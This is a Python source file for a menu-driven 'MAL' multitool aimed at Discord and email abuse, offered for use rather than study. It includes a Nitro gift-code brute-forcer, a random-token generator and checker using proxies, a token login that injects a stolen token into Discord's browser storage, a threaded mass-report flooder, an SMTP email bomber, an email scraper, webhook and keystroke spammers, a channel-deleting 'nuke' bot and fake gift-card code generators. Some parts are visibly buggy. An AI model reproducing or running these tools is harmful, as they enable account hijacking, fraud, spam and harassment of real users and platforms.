import random
from itertools import cycle
import base64
from random import randint
import ctypes
import string
import os
import time
import discord
import pyfiglet
import pyautogui
import lxml
from bs4 import BeautifulSoup
import json
import sys
import pyperclip
import threading
from tkinter.constants import W
from collections import deque
from selenium import webdriver
import requests
import requests.exceptions
import urllib.parse
import re
import smtplib

banner = pyfiglet.figlet_format("MAL")
print(banner)

print('''
   |
   | -------------------------------------------------
   |             Made by !Mal#5277
   | 1. Nitro Gen+Checker (NG)
   | 2. Token Gen+Checker (TG)
   | 3. Giftcard Gen (G)
   | 4. Email Bomber (EB)
   | 5. Email Scraper (ES)
   | 6. Spammer (S)
   | 7. Webhook Spammer (WS)
   | 8. Mass Report (MS)
   | 9. Token Logger (TL)
   | 10. Nuke Bot (NB)
   |             Made by !Mal#5277
   | -------------------------------------------------
   |
''')

print("Enter your Choice of Tool:")
tn = input("You: ").lower()
print('\n')


def DiscordBot():
    from discord.ext import commands
    import discord as d

    print("Enter your bots Token: ")
    token = input("You: ")
    print('\n')

    print("!!Invite your bot to the server!!")
    print("$nuke (CHANNEL ID)\n")
    done = input("Enter DONE when finished: ")
    print('\n')

    if done == 'done':
        token = token
        client = commands.Bot(command_prefix='$', help_command=None)

        @client.event
        async def on_ready():
            print(f'{client.user} has Awoken!')

        @client.command()
        async def nuke(ctx, channel: d.TextChannel):
            mbed = d.Embed(
                title='Nuked',
                description='I OWN YOU ALL NOW'
            )
            if ctx.author.guild_permissions.manage_channels:
                await ctx.send(embed=mbed)
                await channel.delete()
        client.run(token)

    else:
        exit()


def TokenLogger():
    def autologin():
        os.system('cls')

        banner = pyfiglet.figlet_format("MAL")
        print(banner)

        print("Enter the token of the account you want to connect to: ")
        print()
        entertoken = str(input("Token: "))
        print("\n\n")
        if len(entertoken) >= 59:
            driver = webdriver.Chrome(executable_path=r'chromedriver.exe')
            driver.maximize_window()
            driver.get('https://discord.com/login')
            js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
            time.sleep(3)
            driver.execute_script(js + f'login("{entertoken}")')
            time.sleep(10)
            if driver.current_url == 'https://discord.com/login':
                os.system('cls')
                print("Connection Failed")
                driver.close()
            else:
                os.system('cls')
                print("Connection Established")
            time.sleep(360)
        else:
            print("There is a problem with your Token.")
            time.sleep(2)
            os.system('cls')
    autologin()


def MassReport():
    class massreport:
        def __init__(self):
            os.system('cls')
            banner = pyfiglet.figlet_format("MAL")
            print(banner)

            print("Enter the ID of the server where the message to be reported is located: ")
            self.GUILD_ID = str(input("{Guild ID: "))
            print("Enter the ID of the channel in which the message to be reported is located: ")
            self.CHANNEL_ID = str(input("Channel ID: "))
            print("Enter the ID of the message to be reported: ")
            self.MESSAGE_ID = str(input("Message ID: "))
            print("\nChoose the reason for the report: ")
            print("          Illegal content")
            print("          Harassment")
            print("          Spam or phishing links")
            print("          Self-harm")
            print("          NSFW content\n")
            REASON = input("Choice: ")

            if REASON == '1':
                self.REASON = 0
            elif REASON == '2':
                self.REASON = 1
            elif REASON == '3':
                self.REASON = 2
            elif REASON == '4':
                self.REASON = 3
            elif REASON == '5':
                self.REASON = 4
            else:
                print("      Your request is invalid !")
                time.sleep(2)
                exit()

            self.RESPONSES = {f"""
                401: Unauthorized: Invalid Discord token,
                Missing Access: Missing access to channel or guild,
                You need to verify your account in order to perform this action: Unverified"""}
            self.sent = 0
            self.errors = 0

        def _reporter(self):
            report = requests.post(
                'https://discordapp.com/api/v8/report', json={
                    'channel_id': self.CHANNEL_ID,
                    'message_id': self.MESSAGE_ID,
                    'guild_id': self.GUILD_ID,
                    'reason': self.REASON
                }, headers={
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'sv-SE',
                    'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                    'Content-Type': 'application/json',
                    'Authorization': self.TOKEN
                }
            )
            if (status := report.status_code) == 201:
                self.sent += 1
                print("Reported successfully")
            elif status in (401, 403):
                self.errors += 1
                print(self.RESPONSES[report.json()['message']])
            else:
                self.errors += 1
                print("Error: {report.text} | Status Code: {status}")

        def _update_title(self):
            while True:
                os.system(f'title [Discord Reporter] - Sent: {self.sent} ^| Errors: {self.errors}')
                time.sleep(0.1)

        def _multi_threading(self):
            threading.Thread(target=self._update_title).start()
            while True:
                if threading.active_count() <= 300:
                    time.sleep(1)
                    threading.Thread(target=self._reporter).start()

        def setup(self):
            recognized = None
            if os.path.exists(config_json := 'temp/Config.json'):
                with open(config_json, 'r') as f:
                    try:
                        data = json.load(f)
                        self.TOKEN = data['discordToken']
                    except (KeyError, json.decoder.JSONDecodeError):
                        recognized = False
                    else:
                        recognized = True
            else:
                recognized = False

            if not recognized:
                print("\nEnter your token: ")
                self.TOKEN = input("Token: ")
                with open(config_json, 'w') as f:
                    json.dump({'discordToken': self.TOKEN}, f)
            print()
            self._multi_threading()

    mr = massreport()
    mr.setup()


def EmailScraper():
    ascii_banner = pyfiglet.figlet_format("Mals Email Scraper")
    print(ascii_banner)

    user_url = str(input('[+] Enter Target URL To Scan: '))
    urls = deque([user_url])

    counter = input("[+] Enter how limit of how many emails to scrape: ")

    scraped_urls = set()
    emails = set()

    count = 0
    try:
        while len(urls):
            count += 1
            if count == counter:
                break
            url = urls.popleft()
            scraped_urls.add(url)

            parts = urllib.parse.urlsplit(url)
            base_url = '{0.scheme}://{0.netloc}'.format(parts)

            path = url[:url.rfind('/') + 1] if '/' in parts.path else url

            print('[%d] Processing %s' % (count, url))
            try:
                response = requests.get(url)
            except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                continue

            new_emails = set(re.findall(r"[a-z0-9\-+_]+@[a-z0-9\-+_]+\.[a-z]+", response.text, re.I))
            emails.update(new_emails)

            soup = BeautifulSoup(response.text, features="lxml")

            for anchor in soup.find_all("a"):
                link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
                if link.startswith('/'):
                    link = base_url + link
                elif not link.startswith('http'):
                    link = path + link
                if not link in urls and not link in scraped_urls:
                    urls.append(link)

    except KeyboardInterrupt:
        print('[-] Closing!')

    for mail in emails:
        print(mail)


def EmailBomber():
    def banner():
        print('+[+[+[ Email-Bomber v1.0 ]+]+]+')
        print('+[+[+[ made with codes ]+]+]+')
        print('''
                         \|/
                           `--+--'
                              |
                          ,--'#`--.
                          |#######|
                       _.-'#######`-._
                    ,-'###############`-.
                  ,'#####################`,         .___     .__         .
                 |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
                |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
               |#############################|
               |#############################|              Author: !Mal#5277
               |#############################|
                |###########################|
                 \#########################/
                  `.#####################,'
                    `._###############_,'
                       `--..#####..--'                                 ,-.--.
    *.______________________________________________________________,' (Bomb)
                                                                        `--' ''')

    class Email_Bomber:
        count = 0

        def __init__(self):
            try:
                print('\n+[+[+[ Initializing program ]+]+]+')
                self.target = str(input('Enter target email <: '))
                self.mode = int(
                    input('Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('ERROR: Invalid Option. GoodBye.')
                    sys.exit(1)
            except Exception as e:
                print(f'ERROR: {e}')

        def bomb(self):
            try:
                print('\n+[+[+[ Setting up bomb ]+]+]+')
                self.amount = None
                if self.mode == int(1):
                    self.amount = int(1000)
                elif self.mode == int(2):
                    self.amount = int(500)
                elif self.mode == int(3):
                    self.amount = int(250)
                else:
                    self.amount = int(input('Choose a CUSTOM amount <: '))
                print(
                    f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
            except Exception as e:
                print(f'ERROR: {e}')

        def email(self):
            try:
                print('\n+[+[+[ Setting up email ]+]+]+')
                self.server = str(input(
                    'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
                premade = ['1', '2', '3']
                default_port = True
                if self.server not in premade:
                    default_port = False
                    self.port = int(input('Enter port number <: '))

                if default_port == True:
                    self.port = int(587)

                if self.server == '1':
                    self.server = 'smtp.gmail.com'
                elif self.server == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif self.server == '3':
                    self.server = 'smtp-mail.outlook.com'

                self.fromAddr = str(input('Enter from address <: '))
                self.fromPwd = str(input('Enter from password <: '))
                self.subject = str(input('Enter subject <: '))
                self.message = str(input('Enter message <: '))

                self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

                self.s = smtplib.SMTP(self.server, self.port)
                self.s.ehlo()
                self.s.starttls()
                self.s.ehlo()
                self.s.login(self.fromAddr, self.fromPwd)
            except Exception as e:
                print(f'ERROR: {e}')

        def send(self):
            try:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                self.count += 1
                print(f'BOMB: {self.count}')
            except Exception as e:
                print(f'ERROR: {e}')

        def attack(self):
            print('\n+[+[+[ Attacking... ]+]+]+')
            for email in range(self.amount + 1):
                self.send()
            self.s.close()
            print('\n+[+[+[ Attack finished ]+]+]+')
            sys.exit(0)

    if __name__ == '__main__':
        banner()
        bomb = Email_Bomber()
        bomb.bomb()
        bomb.email()
        bomb.attack()


def WebhookSpammer():
    banner = pyfiglet.figlet_format("Webhook Spammer")
    print(banner)

    msg = input("Please Insert WebHook Spam Message: ")
    webhook = input("Please Insert WebHook URL: ")

    def spam(msg, webhook):
        while True:
            try:
                data = requests.post(webhook, json={'content': msg})
                if data.status_code == 204:
                    print(f"Sent MSG {msg}")
            except:
                print("Bad Webhook :" + webhook)
                time.sleep(5)
                exit()


def Giftcard():
    # functions
    def g(rolls):
        data = "qwertyuioplkjhgfdsazxcvbnm1234567890QWERTYUIOPLKJHGFDSAZXCVBNM"
        result = ""
        while rolls >= 1:
            c = random.choice(data)
            result = c + result
            rolls = rolls - 1
        return result

    banner = pyfiglet.figlet_format("Gifter")
    print(banner)

    # interface
    print("Multiple Gift Card Generator")
    print("")
    print("What Giftcard you need to generate?" + '\n')

    print("Amazon")
    print("Roblox")
    print("Webkinz")
    print("Fortnite")
    print("IMVU")
    print("Asda")
    print("Ebay")
    print("Netflix")
    print("iTunes")
    print("Paypal")
    print("Visa")
    print("Sainsburrys")
    print("PokemonTGC")
    print("Playstation")
    print("Steam")
    print("Xbox")
    print("PlayStore")
    print("Youtube")
    print("Spotify")
    print("Minecraft")

    tt = input(
        "\n\n\n>")

    t = tt.lower()
    print("")
    print("How many of them?")
    nn = input(">")
    print("")
    n = int(nn)

    if t == "minecraft":
        f = open("Minecraft.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + "-" + g(4) + "-" + g(4))

        for x in range(n):
            out = g(4) + "-" + g(4) + "-" + g(4)
            f.write(out + '\n')

    if t == "paypal":
        f = open("Paypal.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + "-" + g(4) + "-" + g(4))

        for x in range(n):
            out = g(4) + "-" + g(4) + "-" + g(4)
            f.write(out + '\n')

    if t == "playstation":
        f = open("Playstation.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + "-" + g(4) + "-" + g(4))

        for x in range(n):
            out = g(4) + "-" + g(4) + "-" + g(4)
            f.write(out + '\n')

    if t == "amazon":
        f = open("Amazon.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + "-" + g(6) + "-" + g(4))

        for x in range(n):
            out = g(4) + "-" + g(6) + "-" + g(4)
            f.write(out + '\n')

    if t == "netflix":
        f = open("Netflix.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + "-" + g(6) + "-" + g(4))

        for x in range(n):
            out = g(4) + "-" + g(6) + "-" + g(4)
            f.write(out + '\n')

    if t == "steam":
        f = open("Steam.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + "-" + g(6) + "-" + g(5))

        for x in range(n):
            out = g(4) + "-" + g(6) + "-" + g(5)
            f.write(out + '\n')

    if t == "fortnite":
        f = open("Fortnite.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(5) + "-" + g(4) + "-" + g(4))

        for x in range(n):
            out = g(5) + "-" + g(4) + "-" + g(4)

            f.write(out + '\n')

    if t == "roblox":
        f = open("Roblox.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(3) + "-" + g(3) + "-" + g(4))

        for x in range(n):
            out = g(5) + "-" + g(4) + "-" + g(4)

            f.write(out + '\n')

    if t == "itunes":
        f = open("iTunes.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(16))

        for x in range(n):
            out = g(16)
            f.write(out + '\n')

    if t == "ebay":
        f = open("Ebay.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(10))

        for x in range(n):
            out = g(10)
            f.write(out + '\n')

    if t == "imvu":
        f = open("IMVU.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(10))

        for x in range(n):
            out = g(10)
            f.write(out + '\n')

    if t == "webkinz":
        f = open("Webinz.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(8))

        for x in range(n):
            out = g(8)
            f.write(out + '\n')

    if t == "pokemontgc":
        f = open("PokemonTGC.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(3) + "-" + g(4) + "-" + g(3) + "-" + g(3))

        for x in range(n):
            out = g(3) + "-" + g(4) + "-" + g(3) + "-" + g(3)
            f.write(out + '\n')

    if t == "playstore":
        f = open("Playstore.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + "-" + g(4) + "-" + g(4) + "-" + g(4) + "-" + g(4))

        for x in range(n):
            out = g(4) + "-" + g(4) + "-" + g(4) + "-" + g(4) + "-" + g(4)
            f.write(out + '\n')

    if t == "xbox":
        f = open("Xbox.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5))

        for x in range(n):
            out = g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5)
            f.write(out + '\n')

    if t == "youtube":
        f = open("Youtube.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(12))

        for x in range(n):
            out = g(12)
            f.write(out + '\n')

    if t == "spotify":
        f = open("Spotify.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(8))

        for x in range(n):
            out = g(8)
            f.write(out + '\n')

    if t == "asda":
        f = open("Asda.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + '-' + g(4) + '-' + g(4) + '-' + g(4))

        for x in range(n):
            out = g(4) + '-' + g(4) + '-' + g(4) + '-' + g(4)
            f.write(out + '\n')

    if t == "sainsburrys":
        f = open("Sainsburrys.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(8))

        for x in range(n):
            out = g(4) + '-' + g(3) + '-' + g(4) + '-' + g(4) + '-' + g(4)
            f.write(out + '\n')

    if t == "new look":
        f = open("New_Look.txt", 'w')
        f.write('''
        --------------------------------
                     MADE BY MAL
        --------------------------------
        ''')
        for x in range(n):
            print("")
            print(g(4) + '-' + g(4) + '-' + g(4) + '-' + g(4))

        for x in range(n):
            out = g(4) + '-' + g(4) + '-' + g(4) + '-' + g(4)
            f.write(out + '\n')

    print("")
    print("-----Generation completed-----")
    print("--------Files Saved--------")
    time.sleep(360)


def spammer():
    banner = pyfiglet.figlet_format("SpammerX")
    print(banner)

    msg = input("Enter your message: ")
    times = input("How many time do you want to do this?( 0 for inf ): ")
    times = int(times)

    print("t minus")
    print("5")
    time.sleep(1)
    print("4")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    time.sleep(1)

    if times == '0':
        pyautogui.typewrite(msg)
        pyautogui.press("enter")

    for repeat in range(0, times):
        pyautogui.typewrite(msg)
        pyautogui.press("enter")


def MainNitroGen():
    USE_WEBHOOK = True

    time.sleep(3)
    os.system('cls' if os.name == 'nt' else 'clear')

    try:  # Check if the requrements have been installed
        from discord_webhook import DiscordWebhook  # Try to import discord_webhook
    except ImportError:  # If it chould not be installed
        # Tell the user it has not been installed and how to install it
        input(
            f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nYou can ignore this error if you aren't going to use a webhook.\nPress enter to continue.")
        USE_WEBHOOK = False
    try:  # Setup try statement to catch the error
        import requests  # Try to import requests
    except ImportError:  # If it has not been installed
        # Tell the user it has not been installed and how to install it
        input(
            f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")
        exit()  # Exit the program
    try:  # Setup try statement to catch the error
        import numpy  # Try to import requests
    except ImportError:  # If it has not been installed
        # Tell the user it has not been installed and how to install it
        input(
            f"Module numpy not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install numpy'\nPress enter to exit")
        exit()  # Exit the program

    # check if user is connected to internet
    url = "https://github.com"
    try:
        response = requests.get(url)  # Get the responce from the url
        print("Internet check")
        time.sleep(.4)
    except requests.exceptions.ConnectionError:
        # Tell the user
        input("You are not connected to internet, check your connection and try again.\nPress enter to exit")
        exit()  # Exit program

    class NitroGen:  # Initialise the class
        def __init__(self):  # The initaliseaiton function
            self.fileName = "Nitro Codes.txt"  # Set the file name the codes are stored in

        def main(self):  # The main function contains the most important code
            os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
            if os.name == "nt":  # If the system is windows
                print("")
                ctypes.windll.kernel32.SetConsoleTitleW(
                    "Nitro Generator and Checker - Made by !Mal#5277")  # Change the
            else:  # Or if it is unix
                print(f'\33]0;Nitro Generator and Checker - Made by !Mal#5277\a',
                      end='', flush=True)  # Update title of command prompt

            banner = pyfiglet.figlet_format("Gen+Checker")
            print(banner)

            time.sleep(2)  # Wait a few seconds
            # Print who developed the code
            self.slowType("Made by: !Mal#5277", .02)
            time.sleep(1)  # Wait a little more
            # Print the first question
            self.slowType(
                "\nInput How Many Codes to Generate and Check: ", .02, newLine=False)

            try:
                num = int(input(''))  # Ask the user for the amount of codes
            except ValueError:
                input("Specified input wasn't a number.\nPress enter to exit")
                exit()  # Exit program

            if USE_WEBHOOK:
                # Get the webhook url, if the user does not wish to use a webhook the message will be an empty string
                self.slowType(
                    "If you want to use a Discord webhook, type it here or press enter to ignore: ", .02, newLine=False)
                url = input('')  # Get the awnser
                # If the url is empty make it be None insted
                webhook = url if url != "" else None

            if webhook is not None:
                DiscordWebhook(  # Let the user know it has started logging the ids
                    url=url,
                    content=f"```Started checking urls\nI will send any valid codes here```"
                ).execute()

            # print() # Print a newline for looks

            valid = []  # Keep track of valid codes
            invalid = 0  # Keep track of how many invalid codes was detected
            chars = []
            chars[:0] = string.ascii_letters + string.digits

            # generate codes faster than using random.choice
            c = numpy.random.choice(chars, size=[num, 19])
            for s in c:  # Loop over the amount of codes to check
                try:
                    code = ''.join(x for x in s)
                    url = f"https://discord.gift/{code}"  # Generate the url

                    result = self.quickChecker(url, webhook)  # Check the codes

                    if result:  # If the code was valid
                        # Add that code to the list of found codes
                        valid.append(url)
                    else:  # If the code was not valid
                        invalid += 1  # Increase the invalid counter by one
                except KeyboardInterrupt:
                    # If the user interrupted the program
                    print("\nInterrupted by user")
                    break  # Break the loop

                except Exception as e:  # If the request fails
                    print(f" Error | {url} ")  # Tell the user an error occurred

                if os.name == "nt":  # If the system is windows
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by !Mal#5277")  # Change the title
                    print("")
                else:  # If it is a unix system
                    # Change the title
                    print(
                        f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by !Mal#5277\a',
                        end='', flush=True)

            print(f"""
    Results:
     Valid: {len(valid)}
     Invalid: {invalid}
     Valid Codes: {', '.join(valid)}""")  # Give a report of the results of the check

            # Tell the user the program finished
            input("\nThe end! Press Enter 5 times to close the program.")
            [input(i) for i in range(4, 0, -1)]  # Wait for 4 enter presses

        # Function used to print text a little more fancier
        def slowType(self, text: str, speed: float, newLine=True):
            for i in text:  # Loop over the message
                # Print the one charecter, flush is used to force python to print the char
                print(i, end="", flush=True)
                time.sleep(speed)  # Sleep a little before the next one
            if newLine:  # Check if the newLine argument is set to True
                print()  # Print a final newline to make it act more like a normal print statement

        def quickChecker(self, nitro: str, notify=None):  # Used to check a single code at a time
            # Generate the request url
            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
            response = requests.get(url)  # Get the response from discord

            if response.status_code == 200:  # If the responce went through
                # Notify the user the code was valid
                print(f" Valid | {nitro} ", flush=True,
                      end="" if os.name == 'nt' else "\n")
                with open("Nitro Codes.txt", "w") as file:  # Open file to write
                    # Write the nitro code to the file it will automatically add a newline
                    file.write(nitro)

                if notify is not None:  # If a webhook has been added
                    DiscordWebhook(
                        # Send the message to discord letting the user know there has been a valid nitro code
                        url=url,
                        content=f"Valid Nito Code detected! @everyone \n{nitro}"
                    ).execute()

                return True  # Tell the main function the code was found

            # If the responce got ignored or is invalid ( such as a 404 or 405 )
            else:
                # Tell the user it tested a code and it was invalid
                print(f" Invalid | {nitro} ", flush=True,
                      end="" if os.name == 'nt' else "\n")
                return False  # Tell the main function there was not a code found

    if __name__ == '__main__':
        Gen = NitroGen()  # Create the nitro generator object
        Gen.main()  # Run the main code


def mainTokenGen():
    import proxygen

    banner = pyfiglet.figlet_format("Token Gen+Checker")
    print(banner)

    N = input("How many tokens : ")
    count = 0
    current_path = os.path.dirname(os.path.realpath(__file__))
    url = "https://discordapp.com/api/v6/users/@me/library"

    while (int(count) < int(N)):
        tokens = []
        base64_string = "=="
        while (base64_string.find("==") != -1):
            sample_string = str(randint(000000000000000000, 999999999999999999))
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string + "." + random.choice(string.ascii_letters).upper() + ''.join(
                random.choice(string.ascii_letters + string.digits)
                for _ in range(5)) + "." + ''.join(
                random.choice(string.ascii_letters + string.digits) for _ in range(27))
            count += 1
            tokens.append(token)
        proxies = proxygen.get_proxies()
        proxy_pool = cycle(proxies)

        for token in tokens:
            proxy = next(proxy_pool)
            header = {
                "Content-Type": "application/json",
                "authorization": token
            }
            r = requests.get(url, headers=header, proxies={"http": proxy})
            print(token)
            if r.status_code == 200:
                print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
                f = open(current_path + "/" + "workingtokens.txt", "a")
                f.write(token + "\n")
            elif "rate limited." in r.text:
                print("[-] You are being rate limited.")
            else:
                print(u"\u001b[31m[-] Invalid Token.\u001b[0m")
        tokens.remove(token)


if tn == 'tg':
    print("Loading...")
    mainTokenGen()
elif tn == 'ng':
    print("Loading...")
    MainNitroGen()
elif tn == 'eb':
    print("Loading...")
    EmailBomber()
elif tn == 'es':
    print("Loading...")
    EmailScraper()
elif tn == 'g':
    print("Loading...")
    Giftcard()
elif tn == 'ws':
    print("Loading...")
    WebhookSpammer()
elif tn == 's':
    print("Loading...")
    spammer()
elif tn == 'ms':
    print("Loading...")
    MassReport()
elif tn == 'tl':
    print("Loading...")
    TokenLogger()
elif tn == 'nb':
    DiscordBot()
else:
    print("---INVALID---")
    time.sleep(360)
